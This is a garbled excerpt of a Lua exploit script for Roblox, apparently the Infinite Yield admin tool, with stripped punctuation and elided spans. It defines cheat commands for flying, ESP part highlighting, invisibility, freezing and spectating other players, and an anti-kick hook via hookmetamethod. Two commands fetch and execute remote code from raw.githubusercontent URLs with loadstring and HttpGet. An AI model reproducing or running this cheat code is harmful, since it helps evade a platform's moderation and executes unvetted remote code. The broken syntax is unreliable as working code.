		bv.Name = velocityHandlerName
		bv.Parent = root
		bv.MaxForce = v3zero
	...
	mfly2 = RunService.RenderSteppedConnect(function()
		root = getRoot(speaker.Character)
		camera = workspace.CurrentCamera
		if speaker.CharacterFindFirstChildWhichIsA(Humanoid) and root and rootFindFirstChild(velocityHandlerName) and rootFindFirstChild(gyroHandlerName) then
			local humanoid = speaker.CharacterFindFirstChildWhichIsA(Humanoid)
			local VelocityHandler = rootFindFirstChild(velocityHandlerName)
			local GyroHandler = rootFindFirstChild(gyroHandlerName)
			...
			local direction = controlModuleGetMoveVector()
...
addcmd('cframefly', {'cfly'}, function(args, speaker)
	...
	speaker.CharacterFindFirstChildOfClass('Humanoid').PlatformStand = true
	local Head = speaker.CharacterWaitForChild(Head)
	Head.Anchored = true
	if CFloop then CFloopDisconnect() end
	CFloop = RunService.HeartbeatConnect(function(deltaTime)
		local moveDirection = speaker.CharacterFindFirstChildOfClass('Humanoid').MoveDirection  (CFspeed  deltaTime)
		local headCFrame = Head.CFrame
		local cameraCFrame = workspace.CurrentCamera.CFrame
		local cameraOffset = headCFrameToObjectSpace(cameraCFrame).Position
...
addcmd('uncframefly',{'uncfly'},function(args, speaker)
	if CFloop then
		CFloopDisconnect()
		speaker.CharacterFindFirstChildOfClass('Humanoid').PlatformStand = false
		local Head = speaker.CharacterWaitForChild(Head)
		Head.Anchored = false
	end
end)
...
addcmd('float', {'platform'},function(args, speaker)
	...
	if pchar and not pcharFindFirstChild(floatName) then
		task.spawn(function()
			...
			qUp = IYMouse.KeyUpConnect(function(KEY)
				if KEY == 'q' then
					FloatValue = FloatValue + 0.5
				end
			end)
			eUp = IYMouse.KeyUpConnect(function(KEY)
				if KEY == 'e' then
					FloatValue = FloatValue - 1.5
				end
			end)
			qDown = IYMouse.KeyDownConnect(function(KEY)
				if KEY == 'q' then
					FloatValue = FloatValue - 0.5
				end
			end)
			eDown = IYMouse.KeyDownConnect(function(KEY)
				if KEY == 'e' then
					FloatValue = FloatValue + 1.5
				end
			end)
			floatDied = speaker.CharacterFindFirstChildOfClass('Humanoid').DiedConnect(function()
				FloatingFuncDisconnect()
				FloatDestroy()
				qUpDisconnect()
				eUpDisconnect()
				qDownDisconnect()
			...
			local function FloatPadLoop()
				if pcharFindFirstChild(floatName) and getRoot(pchar) then
					Float.CFrame = getRoot(pchar).CFrame  CFrame.new(0,FloatValue,0)
				else
					FloatingFuncDisconnect()
					FloatDestroy()
			...
			FloatingFunc = RunService.HeartbeatConnect(FloatPadLoop)
		end)
	end
end)
...
addcmd('unfloat',{'nofloat','unplatform','noplatform'},function(args, speaker)
	...
	if pcharFindFirstChild(floatName) then
		pcharFindFirstChild(floatName)Destroy()
	end
	if floatDied then
		FloatingFuncDisconnect()
		qUpDisconnect()
...
addcmd('swim',{},function(args, speaker)
	if not swimming and speaker and speaker.Character and speaker.CharacterFindFirstChildWhichIsA(Humanoid) then
		...
		local Humanoid = speaker.CharacterFindFirstChildWhichIsA(Humanoid)
		gravReset = Humanoid.DiedConnect(swimDied)
		local enums = Enum.HumanoidStateTypeGetEnumItems()
		table.remove(enums, table.find(enums, Enum.HumanoidStateType.None))
		for i, v in pairs(enums) do
			HumanoidSetStateEnabled(v, false)
		end
		HumanoidChangeState(Enum.HumanoidStateType.Swimming)
		swimbeat = RunService.HeartbeatConnect(function()
			pcall(function()
				speaker.Character.HumanoidRootPart.Velocity = ((Humanoid.MoveDirection ~= Vector3.new() or UserInputServiceIsKeyDown(Enum.KeyCode.Space)) and speaker.Character.HumanoidRootPart.Velocity or Vector3.new())
			end)
		end)
		swimming = true
	end
...
addcmd('unswim',{'noswim'},function(args, speaker)
	if speaker and speaker.Character and speaker.CharacterFindFirstChildWhichIsA(Humanoid) then
		workspace.Gravity = oldgrav
		swimming = false
		if gravReset then
			gravResetDisconnect()
		...
		table.remove(enums, table.find(enums, Enum.HumanoidStateType.None))
		for i, v in pairs(enums) do
			HumanoidSetStateEnabled(v, true)
		end
	end
end)
...
addcmd('tweenwaypoint',{'twp'},function(args, speaker)
	...
	if speaker.Character then
		for i,_ in pairs(WayPoints) do
			...
			local z = WayPoints[i].COORD[3]
			if tostring(WayPoints[i].NAME)lower() == tostring(WPName)lower() then
				TweenServiceCreate(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = CFrame.new(x,y,z)})Play()
			end
		end
		for i,_ in pairs(pWayPoints) do
			if tostring(pWayPoints[i].NAME)lower() == tostring(WPName)lower() then
				TweenServiceCreate(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = CFrame.new(pWayPoints[i].COORD[1].Position)})Play()
			end
		end
	end
end)
...
addcmd('walktowaypoint',{'wtwp'},function(args, speaker)
	...
	if speaker.Character then
		for i,_ in pairs(WayPoints) do
			...
			local z = WayPoints[i].COORD[3]
			if tostring(WayPoints[i].NAME)lower() == tostring(WPName)lower() then
				if speaker.CharacterFindFirstChildOfClass('Humanoid') and speaker.CharacterFindFirstChildOfClass('Humanoid').SeatPart then
					speaker.CharacterFindFirstChildOfClass('Humanoid').Sit = false
					wait(.1)
				end
				speaker.CharacterFindFirstChildOfClass('Humanoid').WalkToPoint = Vector3.new(x,y,z)
			end
		end
		for i,_ in pairs(pWayPoints) do
			if tostring(pWayPoints[i].NAME)lower() == tostring(WPName)lower() then
				...
				speaker.CharacterFindFirstChildOfClass('Humanoid').WalkToPoint = Vector3.new(pWayPoints[i].COORD[1].Position)
			end
		end
	end
end)
...
addcmd('deletewaypoint',{'dwp','dpos','deleteposition','deletepos'},function(args, speaker)
	for i,v in pairs(WayPoints) do
		if v.NAMElower() == tostring(getstring(1))lower() then
...
for _, enumItem in ipairs(Enum.CoreGuiTypeGetEnumItems()) do
	coreGuiTypeNames[enumItem.Namelower()] = enumItem
end
...
addcmd('enable',{},function(args, speaker)
	...
	if input then
		if input == reset then
			StarterGuiSetCore(ResetButtonCallback, true)
		else
			local coreGuiType = coreGuiTypeNames[input]
			if coreGuiType then
				StarterGuiSetCoreGuiEnabled(coreGuiType, true)
			end
		end
	end
end)
...
addcmd('disable',{},function(args, speaker)
	...
	if input then
		if input == reset then
			StarterGuiSetCore(ResetButtonCallback, false)
		else
			local coreGuiType = coreGuiTypeNames[input]
			if coreGuiType then
				StarterGuiSetCoreGuiEnabled(coreGuiType, false)
			end
		end
	end
end)
...
addcmd('showguis',{},function(args, speaker)
	for i,v in pairs(speakerFindFirstChildWhichIsA(PlayerGui)GetDescendants()) do
		if (vIsA(Frame) or vIsA(ImageLabel) or vIsA(ScrollingFrame)) and not v.Visible then
			v.Visible = true
...
addcmd('hideguis',{},function(args, speaker)
	for i,v in pairs(speakerFindFirstChildWhichIsA(PlayerGui)GetDescendants()) do
		if (vIsA(Frame) or vIsA(ImageLabel) or vIsA(ScrollingFrame)) and v.Visible then
			v.Visible = false
...
function deleteGuisAtPos()
	pcall(function()
		local guisAtPosition = Players.LocalPlayer.PlayerGuiGetGuiObjectsAtPosition(IYMouse.X, IYMouse.Y)
		for _, gui in pairs(guisAtPosition) do
...
addcmd('guidelete',{},function(args, speaker)
	deleteGuiInput = UserInputService.InputBeganConnect(function(input, gameProcessedEvent)
...
addcmd('unguidelete',{'noguidelete'},function(args, speaker)
	if deleteGuiInput then deleteGuiInputDisconnect() end
...
addcmd('clientantikick',{'antikick'},function(args, speaker)
	...
	oldhmmi = hookmetamethod(game, __index, function(self, method)
		if self == LocalPlayer and methodlower() == kick then
...
addcmd('antilag',{'boostfps','lowgraphics'},function(args, speaker)
	local Terrain = workspaceFindFirstChildOfClass('Terrain')
	...
	for i,v in pairs(gameGetDescendants()) do
		if vIsA(Part) or vIsA(UnionOperation) or vIsA(MeshPart) or vIsA(CornerWedgePart) or vIsA(TrussPart) then
			v.Material = Plastic
			v.Reflectance = 0
		elseif vIsA(Decal) then
			v.Transparency = 1
		elseif vIsA(ParticleEmitter) or vIsA(Trail) then
			v.Lifetime = NumberRange.new(0)
		elseif vIsA(Explosion) then
			v.BlastPressure = 1
			v.BlastRadius = 1
		end
	end
	for i,v in pairs(LightingGetDescendants()) do
		if vIsA(BlurEffect) or vIsA(SunRaysEffect) or vIsA(ColorCorrectionEffect) or vIsA(BloomEffect) or vIsA(DepthOfFieldEffect) then
			v.Enabled = false
		end
	end
	workspace.DescendantAddedConnect(function(child)
		task.spawn(function()
			if childIsA('ForceField') then
				RunService.HeartbeatWait()
				childDestroy()
			elseif childIsA('Sparkles') then
				RunService.HeartbeatWait()
				childDestroy()
			elseif childIsA('Smoke') or childIsA('Fire') then
				RunService.HeartbeatWait()
				childDestroy()
			end
		end)
...
addcmd('noesp',{'unesp'},function(args, speaker)
	ESPenabled = false
	for i,c in pairs(COREGUIGetChildren()) do
...
function partAdded(part)
	if #espParts  0 then
		if FindInTable(espParts,part.Namelower()) then
			local a = Instance.new(BoxHandleAdornment)
			a.Name = part.Namelower().._PESP
			a.Parent = part
			a.Adornee = part
			a.AlwaysOnTop = true
			a.ZIndex = 0
...
addcmd('partesp',{},function(args, speaker)
	...
	if not FindInTable(espParts,partEspName) then
		...
		for i,v in pairs(workspaceGetDescendants()) do
			if vIsA(BasePart) and v.Namelower() == partEspName then
				local a = Instance.new(BoxHandleAdornment)
	...
	if partEspTrigger == nil then
		partEspTrigger = workspace.DescendantAddedConnect(partAdded)
	end
end)
...
addcmd('unpartesp',{'nopartesp'},function(args, speaker)
	if args[1] then
		...
		for i,v in pairs(workspaceGetDescendants()) do
			if vIsA(BoxHandleAdornment) and v.Name == partEspName..'_PESP' then
				vDestroy()
			end
		end
	else
		...
		espParts = {}
		for i,v in pairs(workspaceGetDescendants()) do
			if vIsA(BoxHandleAdornment) and v.Namesub(-5) == '_PESP' then
				vDestroy()
			end
		end
	end
...
addcmd('view',{'spectate'},function(args, speaker)
	...
	for i,v in pairs(players) do
		...
		viewDied = Players[v].CharacterAddedConnect(viewDiedFunc)
		local function viewChangedFunc()
			workspace.CurrentCamera.CameraSubject = viewing.Character
		end
		viewChanged = workspace.CurrentCameraGetPropertyChangedSignal(CameraSubject)Connect(viewChangedFunc)
	end
end)
...
addcmd('viewpart',{'viewp'},function(args, speaker)
	...
	if args[1] then
		for i,v in pairs(workspaceGetDescendants()) do
			if v.Namelower() == getstring(1)lower() and vIsA(BasePart) then
				wait(0.1)
...
fcRunning = false
local Camera = workspace.CurrentCamera
workspaceGetPropertyChangedSignal(CurrentCamera)Connect(function()
...
Spring = {} do
	...
	function SpringUpdate(dt, goal)
		local f = self.f2math.pi
		local p0 = self.p
		local v0 = self.v

		local offset = goal - p0
		local decay = math.exp(-fdt)

		local p1 = goal + (v0dt - offset(fdt + 1))decay
		local v1 = (fdt(offsetf - v0) + v0)decay
...
Input = {} do
	...
	PAN_MOUSE_SPEED = Vector2.new(1, 1)(math.pi64)
	NAV_ADJ_SPEED = 0.75
	NAV_SHIFT_MUL = 0.25
	...
	function Input.Vel(dt)
		...
		local shift = UserInputServiceIsKeyDown(Enum.KeyCode.LeftShift)

		return (kKeyboard)(navSpeed(shift and NAV_SHIFT_MUL or 1))
	end

	function Input.Pan(dt)
		local kMouse = mouse.DeltaPAN_MOUSE_SPEED
	...
	do
		...
		function Input.StartCapture()
			ContextActionServiceBindActionAtPriority(FreecamKeyboard,Keypress,false,INPUT_PRIORITY,
				Enum.KeyCode.W,
				Enum.KeyCode.A,
				Enum.KeyCode.S,
				Enum.KeyCode.D,
			...
			ContextActionServiceBindActionAtPriority(FreecamMousePan,MousePan,false,INPUT_PRIORITY,Enum.UserInputType.MouseMovement)
		end
		...
		function Input.StopCapture()
			...
			Zero(keyboard)
			Zero(mouse)
			ContextActionServiceUnbindAction(FreecamKeyboard)
			ContextActionServiceUnbindAction(FreecamMousePan)
		end
	end
end
...
function GetFocusDistance(cameraFrame)
	...
	local projy = 2math.tan(cameraFov2)
	local projx = viewport.xviewport.yprojy
	...
	for x = 0, 1, 0.5 do
		for y = 0, 1, 0.5 do
			...
			local offset = fxcx - fycy + fz
			local origin = cameraFrame.p + offsetznear
			local _, hit = workspaceFindPartOnRay(Ray.new(origin, offset.unitminDist))
	...
	return fzDot(minVect)minDist
end

local function StepFreecam(dt)
	local vel = velSpringUpdate(dt, Input.Vel(dt))
	local pan = panSpringUpdate(dt, Input.Pan(dt))

	local zoomFactor = math.sqrt(math.tan(math.rad(702))math.tan(math.rad(cameraFov2)))

	cameraRot = cameraRot + panVector2.new(0.75, 1)8(dtzoomFactor)
	cameraRot = Vector2.new(math.clamp(cameraRot.x, -math.rad(90), math.rad(90)), cameraRot.y%(2math.pi))

	local cameraCFrame = CFrame.new(cameraPos)CFrame.fromOrientation(cameraRot.x, cameraRot.y, 0)CFrame.new(velVector3.new(1, 1, 1)64dt)
	cameraPos = cameraCFrame.p

	Camera.CFrame = cameraCFrame
	Camera.Focus = cameraCFrameCFrame.new(0, 0, -GetFocusDistance(cameraCFrame))
...
function StartFreecam(pos)
	...
	velSpringReset(Vector3.new())
	panSpringReset(Vector2.new())

	PlayerState.Push()
	RunServiceBindToRenderStep(Freecam, Enum.RenderPriority.Camera.Value, StepFreecam)
	Input.StartCapture()
	fcRunning = true
end
...
function StopFreecam()
	...
	Input.StopCapture()
	RunServiceUnbindFromRenderStep(Freecam)
	PlayerState.Pop()
...
addcmd('tweengotocamera',{'tweengotocam','tgotocam','ttocam'},function(args, speaker)
	TweenServiceCreate(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = workspace.Camera.CFrame})Play()
end)
...
addcmd('lookat',{},function(args, speaker)
	...
	for i,v in pairs(players) do
		...
		if target and targetFindFirstChild('Head') then
...
addcmd('fixcam',{'restorecam'},function(args, speaker)
	StopFreecam()
	execCmd('unview')
	workspace.CurrentCameraremove()
	wait(.1)
	repeat wait() until speaker.Character ~= nil
	workspace.CurrentCamera.CameraSubject = speaker.CharacterFindFirstChildWhichIsA('Humanoid')
...
addcmd('delete',{'remove'},function(args, speaker)
	for i,v in pairs(workspaceGetDescendants()) do
		if v.Namelower() == getstring(1)lower() then
			vDestroy()
		end
	end
...
addcmd('deleteclass',{'removeclass','deleteclassname','removeclassname','dc'},function(args, speaker)
	for i,v in pairs(workspaceGetDescendants()) do
		if v.ClassNamelower() == getstring(1)lower() then
			vDestroy()
		end
	end
...
addcmd('chardelete',{'charremove','cd'},function(args, speaker)
	for i,v in pairs(speaker.CharacterGetDescendants()) do
		if v.Namelower() == getstring(1)lower() then
			vDestroy()
		end
	end
...
addcmd('deletevelocity',{'dv','removevelocity','removeforces'},function(args, speaker)
	for i,v in pairs(speaker.CharacterGetDescendants()) do
		if vIsA(BodyVelocity) or vIsA(BodyGyro) or vIsA(RocketPropulsion) or vIsA(BodyThrust) or vIsA(BodyAngularVelocity) or vIsA(AngularVelocity) or vIsA(BodyForce) or vIsA(VectorForce) or vIsA(LineForce) then
			vDestroy()
		end
	end
end)
...
addcmd('deleteinvisparts',{'deleteinvisibleparts','dip'},function(args, speaker)
	for i,v in pairs(workspaceGetDescendants()) do
		if vIsA(BasePart) and v.Transparency == 1 and v.CanCollide then
			vDestroy()
		end
	end
end)
...
addcmd('btools',{},function(args, speaker)
	for i = 1, 4 do
		...
		Tool.Parent = speakerFindFirstChildOfClass(Backpack)
	end
end)

addcmd('f3x',{'fex'},function(args, speaker)
    loadstring(gameHttpGet(httpsraw.githubusercontent.cominfyiffbackuprefsheadsmainf3x.lua))()
end)
...
addcmd('antiafk',{'antiidle'},function(args, speaker)
	...
	if GC then
		...
		local VirtualUser = cloneref(gameGetService(VirtualUser))
		Players.LocalPlayer.IdledConnect(function()
			VirtualUserCaptureController()
			VirtualUserClickButton2(Vector2.new())
		end)
	end
...
addcmd(datalimit, {}, function(args, speaker)
    ...
    if kbps then
        local NetworkClient = cloneref(gameGetService(NetworkClient))
        NetworkClientSetOutgoingKBPSLimit(kbps)
    end
end)
...
promptNewRig = function(speaker, rig)
	local humanoid = speaker.CharacterFindFirstChildWhichIsA(Humanoid)
	if humanoid then
		AvatarEditorServicePromptSaveAvatar(humanoid.HumanoidDescription, Enum.HumanoidRigType[rig])
		local result = AvatarEditorService.PromptSaveAvatarCompletedWait()
...
addcmd(wallwalk, {walkonwalls}, function(args, speaker)
    loadstring(gameHttpGet(httpsraw.githubusercontent.cominfyiffbackupmainwallwalker.lua))()
end)
...
addcmd('age',{},function(args, speaker)
	...
	notify('Account Age',table.concat(ages, ',n'))
end)
...
addcmd('joindate',{'jd'},function(args, speaker)
	...
	notify(Loading,'Hold on a sec')
	for i,v in pairs(players) do
		local user = gameHttpGet(httpsusers.roblox.comv1users..Players[v].UserId)
		local json = HttpServiceJSONDecode(user)
		local date = json[created]sub(1,10)
		local splitDates = string.split(date,-)
		table.insert(dates,Players[v].Name.. joined ..splitDates[2]....splitDates[3]....splitDates[1])
	end
	notify('Join Date (MonthDayYear)',table.concat(dates, ',n'))
end)
...
addcmd('creatorid',{'creator'},function(args, speaker)
	...
	elseif game.CreatorType == Enum.CreatorType.Group then
		local OwnerID = GroupServiceGetGroupInfoAsync(game.CreatorId).Owner.Id
...
addcmd('norender',{},function(args, speaker)
	RunServiceSet3dRenderingEnabled(false)
end)

addcmd('render',{},function(args, speaker)
	RunServiceSet3dRenderingEnabled(true)
end)
...
addcmd('tweengoto',{'tgoto','tto','tweento'},function(args, speaker)
	...
	for i,v in pairs(players)do
		if Players[v].Character ~= nil then
			...
			TweenServiceCreate(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = getRoot(Players[v].Character).CFrame + Vector3.new(3,1,0)})Play()
		end
	end
	execCmd('breakvelocity')
end)
...
addcmd('vehiclegoto',{'vgoto','vtp','vehicletp'},function(args, speaker)
	...
	for i,v in pairs(players)do
		if Players[v].Character ~= nil then
			local seat = speaker.CharacterFindFirstChildOfClass('Humanoid').SeatPart
			local vehicleModel = seatFindFirstAncestorWhichIsA(Model)
			vehicleModelMoveTo(getRoot(Players[v].Character).Position)
		end
	end
end)
...
addcmd('vehiclenoclip',{'vnoclip'},function(args, speaker)
	...
	wait(0.1)
	execCmd('noclip')
	for i,v in pairs(vehicleModelGetDescendants()) do
		if vIsA(BasePart) and v.CanCollide then
...
addcmd('clientbring',{'cbring'},function(args, speaker)
	...
	for i,v in pairs(players)do
		if Players[v].Character ~= nil then
			if Players[v].CharacterFindFirstChildOfClass('Humanoid') then
				Players[v].CharacterFindFirstChildOfClass('Humanoid').Sit = false
			end
			wait()
			...
			if Players[v].Name ~= speaker.Name and not FindInTable(bringT, Players[v].Name) then
				...
				repeat
					for i,c in pairs(players) do
						if PlayersFindFirstChild(v) then
...
addcmd('walkto',{'follow'},function(args, speaker)
	...
	for i,v in pairs(players)do
		if Players[v].Character ~= nil then
			...
			walkto = true
			repeat wait()
				speaker.CharacterFindFirstChildOfClass('Humanoid')MoveTo(getRoot(Players[v].Character).Position)
...
addcmd('pathfindwalkto',{'pathfindfollow'},function(args, speaker)
	...
	wait()
	local players = getPlayer(args[1], speaker)
	local hum = Players.LocalPlayer.CharacterFindFirstChildOfClass(Humanoid)
	local path = PathServiceCreatePath()
	for i,v in pairs(players)do
		if Players[v].Character ~= nil then
			if speaker.CharacterFindFirstChildOfClass('Humanoid') and speaker.CharacterFindFirstChildOfClass('Humanoid').SeatPart then
				speaker.CharacterFindFirstChildOfClass('Humanoid').Sit = false
			...
			repeat wait()
				local success, response = pcall(function()
					pathComputeAsync(getRoot(speaker.Character).Position, getRoot(Players[v].Character).Position)
					local waypoints = pathGetWaypoints()
					local distance 
					for waypointIndex, waypoint in pairs(waypoints) do
						local waypointPosition = waypoint.Position
						humMoveTo(waypointPosition)
						repeat 
	...
	if speaker.Character then
		for i,_ in pairs(WayPoints) do
			if tostring(WayPoints[i].NAME)lower() == tostring(WPName)lower() then
				...
				repeat wait()
					local success, response = pcall(function()
						pathComputeAsync(getRoot(speaker.Character).Position, TrueCoords)
						local waypoints = pathGetWaypoints()
						local distance 
						for waypointIndex, waypoint in pairs(waypoints) do
							local waypointPosition = waypoint.Position
					...
					if not success then
						speaker.CharacterFindFirstChildOfClass('Humanoid')MoveTo(TrueCoords)
					end
...
addcmd(orbit, {}, function(args, speaker)
    ...
    local target = PlayersFindFirstChild(getPlayer(args[1], speaker)[1])
    local root = getRoot(speaker.Character)
    local humanoid = speaker.CharacterFindFirstChildWhichIsA(Humanoid)
    if target and target.Character and getRoot(target.Character) and root and humanoid then
        ...
        orbit1 = RunService.HeartbeatConnect(function()
            pcall(function()
                rotation = rotation + speed
                root.CFrame = CFrame.new(getRoot(target.Character).Position)  CFrame.Angles(0, math.rad(rotation), 0)  CFrame.new(distance, 0, 0)
            end)
        end)
        orbit2 = RunService.RenderSteppedConnect(function()
            pcall(function()
                root.CFrame = CFrame.new(root.Position, getRoot(target.Character).Position)
            end)
        end)
        orbit3 = humanoid.DiedConnect(function() execCmd(unorbit) end)
        orbit4 = humanoid.SeatedConnect(function(value) if value then execCmd(unorbit) end end)
        notify(Orbit, Started orbiting  .. formatUsername(target))
    end
end)

addcmd(unorbit, {}, function(args, speaker)
    if orbit1 then orbit1Disconnect() end
    if orbit2 then orbit2Disconnect() end
    if orbit3 then orbit3Disconnect() end
    if orbit4 then orbit4Disconnect() end
...
addcmd('freeze',{'fr'},function(args, speaker)
	...
	if players ~= nil then
		for i,v in pairs(players) do
			task.spawn(function()
				for i, x in next, Players[v].CharacterGetDescendants() do
					if xIsA(BasePart) and not x.Anchored then
						x.Anchored = true
					end
				end
			end)
...
addcmd('thaw',{'unfreeze','unfr'},function(args, speaker)
	...
	if players ~= nil then
		for i,v in pairs(players) do
			task.spawn(function()
				for i, x in next, Players[v].CharacterGetDescendants() do
					if x.Name ~= floatName and xIsA(BasePart) and x.Anchored then
						x.Anchored = false
					end
				end
			end)
...
addcmd('loopoof',{},function(args, speaker)
	...
	repeat wait(0.1)
		for i,v in pairs(PlayersGetPlayers()) do
			if v.Character ~= nil and v.CharacterFindFirstChild'Head' then
				for _,x in pairs(v.Character.HeadGetChildren()) do
					if xIsA'Sound' then x.Playing = true end
				end
			end
		end
	until oofing == false
...
addcmd('muteboombox',{},function(args, speaker)
	...
	if players ~= nil then
		for i,v in pairs(players) do
			task.spawn(function()
				for i, x in next, Players[v].CharacterGetDescendants() do
					if xIsA(Sound) and x.Playing == true then
						x.Playing = false
					end
				end
...
addcmd('unmuteboombox',{},function(args, speaker)
	...
	if players ~= nil then
		for i,v in pairs(players) do
			task.spawn(function()
				for i, x in next, Players[v].CharacterGetDescendants() do
					if xIsA(Sound) and x.Playing == false then
						x.Playing = true
					end
				end
			end)
...
addcmd('reset',{},function(args, speaker)
	speaker.CharacterFindFirstChildOfClass(Humanoid)ChangeState(Enum.HumanoidStateType.Dead)
end)

addcmd('freezeanims',{},function(args, speaker)
	local Humanoid = speaker.CharacterFindFirstChildOfClass(Humanoid) or speaker.CharacterFindFirstChildOfClass(AnimationController)
	local ActiveTracks = HumanoidGetPlayingAnimationTracks()
...
addcmd('invisible',{'invis'},function(args, speaker)
	...
	local InvisibleCharacter = CharacterClone()
	InvisibleCharacter.Parent = Lighting
	local Void = workspace.FallenPartsDestroyHeight
	InvisibleCharacter.Name = 
	local CF

	local invisFix = RunService.SteppedConnect(function()
		pcall(function()
			local IsInteger
			...
			local Pos_Seperate = Pos_Stringsplit(', ')
	...
	for i,v in pairs(InvisibleCharacterGetDescendants())do
		if vIsA(BasePart) then
	...
	function Respawn()
		...
		if IsInvis == true then
			pcall(function()
				...
				CharacterFindFirstChildWhichIsA'Humanoid'Destroy()
				IsInvis = false
	...
	local invisDied
	invisDied = InvisibleCharacterFindFirstChildOfClass'Humanoid'.DiedConnect(function()
		Respawn()
		invisDiedDisconnect()
	end)
	...
	CharacterMoveTo(Vector3.new(0,math.pi1000000,0))
	...
	function TurnVisible()
		...
		InvisibleCharacterDestroy()
		Player.Character = Character
		Character.Parent = workspace
		IsInvis = false
		Player.Character.Animate.Disabled = true
		Player.Character.Animate.Disabled = false
		invisDied = CharacterFindFirstChildOfClass'Humanoid'.DiedConnect(function()
			Respawn()
			invisDiedDisconnect()
		end)
		invisRunning = false
...
addcmd('toolinvisible',{'toolinvis','tinvis'},function(args, speaker)
	...
	local boxTouched = box.Touchedconnect(function(part)
		if (part.Parent.Name == Players.LocalPlayer.Name) then
			if touched == false then
				touched = true
				local function apply()
					local no = Char.HumanoidRootPartClone()
					wait(.25)
					Char.HumanoidRootPartDestroy()
					no.Parent = Char
					CharMoveTo(loc)
					touched = false
				end
	...
	local cleanUp
	cleanUp = Players.LocalPlayer.CharacterAddedconnect(function(char)
		boxTouchedDisconnect()
		boxDestroy()
		cleanUpDisconnect()
	end)
	loc = Char.HumanoidRootPart.Position
	CharMoveTo(box.Position + Vector3.new(0,.5,0))
end)
...
addcmd(breakvelocity, {}, function(args, speaker)
	...
	while not BeenASecond do
		for _, v in ipairs(speaker.CharacterGetDescendants()) do
			if vIsA(BasePart) then
...
addcmd('jpower',{'jumppower','jp'},function(args, speaker)
	...
	if isNumber(jpower) then
		if speaker.CharacterFindFirstChildOfClass('Humanoid').UseJumpPower then
			speaker.CharacterFindFirstChildOfClass('Humanoid').JumpPower = jpower
		else
			speaker.CharacterFindFirstChildOfClass('Humanoid').JumpHeight  = jpower
		end
	end
end)
...
addcmd(maxslopeangle, {msa}, function(args, speaker)
	...
	if isNumber(sangle) then
		speaker.CharacterFindFirstChildWhichIsA(Humanoid).MaxSlopeAngle = sangle
	end
end)
...
addcmd(hipheight, {hheight}, function(args, speaker)
	speaker.CharacterFindFirstChildWhichIsA(Humanoid).HipHeight = args[1] or (r15(speaker) and 2.1 or 0)
end)
...
addcmd(dance, {}, function(args, speaker)
	...
	danceTrack = speaker.CharacterFindFirstChildWhichIsA(Humanoid)LoadAnimation(animation)
...
addcmd('nolimbs',{'rlimbs'},function(args, speaker)
	if r15(speaker) then
		for i,v in pairs(speaker.CharacterGetChildren()) do
...
addcmd(sit, {}, function(args, speaker)
	speaker.CharacterFindFirstChildWhichIsA(Humanoid).Sit = true
end)
...
addcmd(lay, {laydown}, function(args, speaker)
	...
	for _, v in ipairs(humanoidGetPlayingAnimationTracks()) do
		vStop()
	end
end)
...
addcmd(sitwalk, {}, function(args, speaker)
	...
	local sit = anims.sitFindFirstChildWhichIsA(Animation).AnimationId
	anims.idleFindFirstChildWhichIsA(Animation).AnimationId = sit
	anims.walkFindFirstChildWhichIsA(Animation).AnimationId = sit
	anims.runFindFirstChildWhichIsA(Animation).AnimationId = sit
	anims.jumpFindFirstChildWhichIsA(Animation).AnimationId = sit
	speaker.CharacterFindFirstChildWhichIsA(Humanoid).HipHeight = not r15(speaker) and -1.5 or 0.5
end)

addcmd(nosit, {}, function(args, speaker)
    speaker.CharacterFindFirstChildWhichIsA(Humanoid)SetStateEnabled(Enum.HumanoidStateType.Seated, false)
end)

addcmd(unnosit, {}, function(args, speaker)
    speaker.CharacterFindFirstChildWhichIsA(Humanoid)SetStateEnabled(Enum.HumanoidStateType.Seated, true)
end)

addcmd(jump, {}, function(args, speaker)
	speaker.CharacterFindFirstChildWhichIsA(Humanoid)ChangeState(Enum.HumanoidStateType.Jumping)
end)

local infJump
infJumpDebounce = false
addcmd(infjump, {infinitejump}, function(args, speaker)
	if infJump then infJumpDisconnect() end
	infJumpDebounce = false
	infJump = UserInputService.JumpRequestConnect(function()
...
addcmd(flyjump, {}, function(args, speaker)
	if flyjump then flyjumpDisconnect() end
	flyjump = UserInputService.JumpRequestConnect(function()
		speaker.CharacterFindFirstChildWhichIsA(Humanoid)ChangeState(Enum.HumanoidStateType.Jumping)
	end)
end)
...
addcmd('autojump',{'ajump'},function(args, speaker)
	...
	local Human = Char and CharFindFirstChildWhichIsA(Humanoid)
	local function autoJump()
		if Char and Human then
			local check1 = workspaceFindPartOnRay(Ray.new(Human.RootPart.Position-Vector3.new(0,1.5,0), Human.RootPart.CFrame.lookVector3), Human.Parent)
			local check2 = workspaceFindPartOnRay(Ray.new(Human.RootPart.Position+Vector3.new(0,1.5,0), Human.RootPart.CFrame.lookVector3), Human.Parent)
	...
	autoJump()
	HumanModCons.ajLoop = (HumanModCons.ajLoop and HumanModCons.ajLoopDisconnect() and false) or RunService.RenderSteppedConnect(autoJump)
	HumanModCons.ajCA = (HumanModCons.ajCA and HumanModCons.ajCADisconnect() and false) or speaker.CharacterAddedConnect(function(nChar)
		Char, Human = nChar, nCharWaitForChild(Humanoid)
		autoJump()
		HumanModCons.ajLoop = (HumanModCons.ajLoop and HumanModCons.ajLoopDisconnect() and false) or RunService.RenderSteppedConnect(autoJump)
	end)
end)
...
addcmd('unautojump',{'noautojump', 'noajump', 'unajump'},function(args, speaker)
	HumanModCons.ajLoop = (HumanModCons.ajLoop and HumanModCons.ajLoopDisconnect() and false) or nil
	HumanModCons.ajCA = (HumanModCons.ajCA and HumanModCons.ajCADisconnect() and false) or nil
end)
...
addcmd('edgejump',{'ejump'},function(args, speaker)
	...
	edgejump()
	HumanModCons.ejLoop = (HumanModCons.ejLoop and HumanModCons.ejLoopDisconnect() and false) or RunService.RenderSteppedConnect(edgejump)
	HumanModCons.ejCA = (HumanModCons.ejCA and HumanModCons.ejCADisconnect() and false) or speaker.CharacterAddedConnect(function(nChar)
		Char, Human = nChar, nCharWaitForChild(Humanoid)
		edgejump()
		HumanModCons.ejLoop = (HumanModCons.ejLoop and HumanModCons.ejLoopDisconnect() and false) or RunService.RenderSteppedConnect(edgejump)
	end)
...
addcmd('unedgejump',{'noedgejump', 'noejump', 'unejump'},function(args, speaker)
